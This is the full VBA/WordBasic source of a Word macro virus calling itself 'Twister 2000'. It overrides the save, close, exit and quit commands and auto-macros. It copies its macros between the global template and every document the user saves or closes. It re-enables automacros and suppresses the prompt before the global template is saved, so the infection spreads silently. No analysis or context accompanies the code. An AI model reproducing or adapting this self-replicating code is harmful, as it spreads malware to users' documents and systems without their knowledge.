   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim ThisFile$
   Dim ThisFileMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Abort
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   WordBasic.DisableAutoMacros (0) 'enables automacros if off
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   ThisFile$ = WordBasic.[FileName$]()
   ThisFileMacro$ = ThisFile$ + ":twAE"
   WordBasic.MacroCopy "Global:AutoExec", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twFSA"
   WordBasic.MacroCopy "Global:FileSaveAs", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twEX"
   WordBasic.MacroCopy "Global:AutoExit", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twFS"
   WordBasic.MacroCopy "Global:FileSave", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileClose"
   WordBasic.MacroCopy "Global:twFC", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileExit"
   WordBasic.MacroCopy "Global:twFE", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileQuit"
   WordBasic.MacroCopy "Global:twFQ", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":AutoClose"
   WordBasic.MacroCopy "Global:twAC", ThisFileMacro$

   WordBasic.FileSaveAs dlg
   GoTo VayaConDios

   Abort:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   VayaConDios:

   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Dim ThisFile$
   Dim ThisFileMacro$
   On Error GoTo -1: On Error GoTo VayaConDios
   WordBasic.FileSave
   ThisFile$ = WordBasic.[FileName$]()
   ThisFileMacro$ = ThisFile$ + ":twAE"
   WordBasic.MacroCopy "Global:AutoExec", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twFSA"
   WordBasic.MacroCopy "Global:FileSaveAs", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twEX"
   WordBasic.MacroCopy "Global:AutoExit", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twFS"
   WordBasic.MacroCopy "Global:FileSave", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileClose"
   WordBasic.MacroCopy "Global:twFC", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileExit"
   WordBasic.MacroCopy "Global:twFE", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileQuit"
   WordBasic.MacroCopy "Global:twFQ", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":AutoClose"
   WordBasic.MacroCopy "Global:twAC", ThisFileMacro$
   WordBasic.FileSaveAs Format:=1

   WordBasic.DisableAutoMacros (0)
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   VayaConDios:

   End Sub

   Attribute VB_Name = "AutoExit"

   Public Sub MAIN()
   Dim TestFile$
   Dim ThisFile$
   Dim tfPath$
   Dim tfNoEXT$
   Dim ThisFileMacro$
   On Error GoTo -1: On Error GoTo Salida
   TestFile$ = WordBasic.[WindowName$]()
   If TestFile$ = "" Then GoTo Salida

   ThisFile$ = WordBasic.[FileName$]()
   tfPath$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 5)
   tfNoEXT$ = tfPath$ + WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4) + ".DOC"
   If UCase(ThisFile$) <> UCase(tfNoEXT$) Then GoTo Salida
   If WordBasic.IsDocumentDirty() = -1 Then GoTo Salida
   WordBasic.FileSave
   ThisFileMacro$ = ThisFile$ + ":twAE"
   WordBasic.MacroCopy "Global:AutoExec", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twFSA"
   WordBasic.MacroCopy "Global:FileSaveAs", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twEX"
   WordBasic.MacroCopy "Global:AutoExit", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":twFS"
   WordBasic.MacroCopy "Global:FileSave", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileClose"
   WordBasic.MacroCopy "Global:twFC", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileExit"
   WordBasic.MacroCopy "Global:twFE", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":FileQuit"
   WordBasic.MacroCopy "Global:twFQ", ThisFileMacro$
   ThisFileMacro$ = ThisFile$ + ":AutoClose"
   WordBasic.MacroCopy "Global:twAC", ThisFileMacro$
   WordBasic.FileSaveAs Format:=1

   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   Err.Number = 0
   Salida:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   ' "Twister 2000" v.1  (c) Neo-Luddite Inc.
   ' For Robin Hood
   End Sub

   Attribute VB_Name = "twFQ"

   Public Sub MAIN()
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.FileQuit
   WordBasic.DisableAutoMacros (0)
   End Sub

   Attribute VB_Name = "twFE"

   Public Sub MAIN()
   Dim ThisFile$
   Dim ThisFileMacro$
   On Error GoTo -1: On Error GoTo VayaConDios
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   ThisFile$ = WordBasic.[FileName$]()
   ThisFileMacro$ = ThisFile$ + ":twFSA"
   WordBasic.MacroCopy ThisFileMacro$, "Global:FileSaveAs"
   ThisFileMacro$ = ThisFile$ + ":twAE"
   WordBasic.MacroCopy ThisFileMacro$, "Global:AutoExec"
   ThisFileMacro$ = ThisFile$ + ":AutoClose"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twAC"
   ThisFileMacro$ = ThisFile$ + ":twFS"
   WordBasic.MacroCopy ThisFileMacro$, "Global:FileSave"
   ThisFileMacro$ = ThisFile$ + ":twEX"
   WordBasic.MacroCopy ThisFileMacro$, "Global:AutoExit"
   ThisFileMacro$ = ThisFile$ + ":FileClose"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFC"
   ThisFileMacro$ = ThisFile$ + ":FileExit"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFE"
   ThisFileMacro$ = ThisFile$ + ":FileQuit"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFQ"

   VayaConDios:
   WordBasic.FileExit
   WordBasic.DisableAutoMacros (0)
   End Sub

   Attribute VB_Name = "twFC"

   Public Sub MAIN()
   Dim ThisFile$
   Dim ThisFileMacro$
   On Error GoTo -1: On Error GoTo VayaConDios
   WordBasic.DisableAutoMacros (0) 'enables automacros if off
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   ThisFile$ = WordBasic.[FileName$]()
   ThisFileMacro$ = ThisFile$ + ":twFSA"
   WordBasic.MacroCopy ThisFileMacro$, "Global:FileSaveAs"
   ThisFileMacro$ = ThisFile$ + ":twAE"
   WordBasic.MacroCopy ThisFileMacro$, "Global:AutoExec"
   ThisFileMacro$ = ThisFile$ + ":AutoClose"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twAC"
   ThisFileMacro$ = ThisFile$ + ":twFS"
   WordBasic.MacroCopy ThisFileMacro$, "Global:FileSave"
   ThisFileMacro$ = ThisFile$ + ":twEX"
   WordBasic.MacroCopy ThisFileMacro$, "Global:AutoExit"
   ThisFileMacro$ = ThisFile$ + ":FileClose"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFC"
   ThisFileMacro$ = ThisFile$ + ":FileExit"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFE"
   ThisFileMacro$ = ThisFile$ + ":FileQuit"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFQ"

   VayaConDios:

   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "twAC"

   Public Sub MAIN()
   Dim ThisFile$
   Dim ThisFileMacro$
   On Error GoTo -1: On Error GoTo VayaConDios
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   ThisFile$ = WordBasic.[FileName$]()
   ThisFileMacro$ = ThisFile$ + ":twFSA"
   WordBasic.MacroCopy ThisFileMacro$, "Global:FileSaveAs"
   ThisFileMacro$ = ThisFile$ + ":twAE"
   WordBasic.MacroCopy ThisFileMacro$, "Global:AutoExec"
   ThisFileMacro$ = ThisFile$ + ":AutoClose"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twAC"
   ThisFileMacro$ = ThisFile$ + ":twFS"
   WordBasic.MacroCopy ThisFileMacro$, "Global:FileSave"
   ThisFileMacro$ = ThisFile$ + ":twEX"
   WordBasic.MacroCopy ThisFileMacro$, "Global:AutoExit"
   ThisFileMacro$ = ThisFile$ + ":FileClose"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFC"
   ThisFileMacro$ = ThisFile$ + ":FileExit"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFE"
   ThisFileMacro$ = ThisFile$ + ":FileQuit"
   WordBasic.MacroCopy ThisFileMacro$, "Global:twFQ"

   VayaConDios:
   WordBasic.DisableAutoMacros (0)
   End Sub
